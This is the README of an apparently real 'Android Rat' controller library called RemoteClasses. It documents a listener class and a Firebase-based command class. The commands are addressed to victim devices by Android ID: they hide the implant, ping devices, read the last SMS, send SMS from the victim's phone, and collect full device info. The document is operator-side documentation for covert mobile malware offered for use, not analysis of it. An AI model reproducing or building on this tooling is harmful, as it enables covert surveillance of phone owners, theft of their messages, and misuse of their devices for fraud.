# RemoteClasses
Android Rat Remote Classes

class Recv

Create An object :
    from Reciver import Recv
    App = Recv(IP = "127.0.0.1" , PORT = 8080)

Set The Throttle For Connection :
        App.set_throttle(ReqsPerMinute = 3) # Set a limit of 3 packets per minute

Get Update :
    while True:
        print(App.get_update())
    
class FireBase

Create An object :
    FM = FireBase()
    
Send HideOne Request:
    FM.__SendHideOne__(androidid) 
    
Send HideAll Request :
    FM.__SendHideAll__()
    
Send PingOne Request :
    FM.__SendPingOne__(androidid)

Send PingAll Request :
    FM.__SendPingAll__()

Send LastSms Request :
    FM.__SendLastSms__(androidid)
    
Send SendSms Request :
    FM.__SendSms__(androidid , Phone , Message)
    
Send FullInfo Request :
    FM.__SendFullInfo__(androidid)

  

    
